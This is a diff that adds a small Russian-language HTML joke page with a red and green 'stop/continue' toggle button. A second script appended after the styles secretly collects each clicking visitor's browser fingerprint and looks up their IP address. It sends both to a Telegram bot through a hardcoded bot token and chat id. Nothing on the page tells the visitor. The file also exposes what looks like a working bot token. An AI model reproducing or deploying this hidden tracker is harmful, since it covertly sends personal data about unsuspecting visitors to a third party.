@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cрачка</title>
+</head>
+<body>
+    <div>
+        <h1>Остановить срачку</h1>
+        <button id="startButton"><span id="ost">Остановить</span><span id="pro">Продолжыть</span></button>
+    </div>
+    <script>
+        const startButton = document.getElementById('startButton');
+        const ost = document.getElementById('ost');
+        const pro = document.getElementById('pro');
+
+        let isRunning = false;
+
+        startButton.addEventListener('click', () => {
+            isRunning = !isRunning;
+            ost.style.display = isRunning ? 'none' : 'inline';
+            pro.style.display = isRunning ? 'inline' : 'none';
+            startButton.style.backgroundColor = isRunning ? 'rgb(255 0 12)' : 'rgb(106, 165, 11)';
+            startButton.style.color = isRunning ? 'rgb(106, 165, 11)' : 'rgb(255 0 12)';
+            
+        });
+    </script>
+    <style>
+        body {
+            background-color: rgb(24, 41, 52);
+        }
+        h1 {
+            color: rgb(255, 0, 12);
+            text-align: center;
+            font-size: 40px;
+            margin-top: 50px;
+        }
+        button {
+            background-color: rgb(106, 165, 11);
+            color: rgb(255 0 12);
+            border: none;
+            border-radius: 10px;
+            padding: 10px 20px;
+            font-size: 20px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+            display: block;
+            position: absolute;
+            left: 50%;
+            top: 50%;
+            transform: translate(-50%, -50%);
+        }
+
+        #pro {
+            display: none;
+            
+        }
+    </style>
+<script>
+    function getDeviceFingerprint() {
+        
+        return [
+            navigator.userAgent,
+            navigator.language,
+            screen.width + 'x' + screen.height,
+            Intl.DateTimeFormat().resolvedOptions().timeZone
+        ].join(' | ');
+    }
+
+    async function sendToTelegramBot(message) {
+        
+        const botToken = '8464772401:AAEGqwq-orR8OqsQ0RQqMswHLtC3-Pef9os';
+        const chatId = '817763029';
+        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+        await fetch(url, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+                chat_id: chatId,
+                text: message
+            })
+        });
+    }
+
+    async function getIpAddress() {
+        try {
+            const response = await fetch('https://api.ipify.org?format=json');
+            const data = await response.json();
+            return data.ip;
+        } catch (error) {
+            return 'IP не удалось получить';
+        }
+    }
+
+    startButton.addEventListener('click', async () => {
+        const fingerprint = getDeviceFingerprint();
+        const ip = await getIpAddress();
+        await sendToTelegramBot('Device fingerprint: ' + fingerprint + '\nIP: ' + ip);
+    });
+</script>
+</body>
+</html>
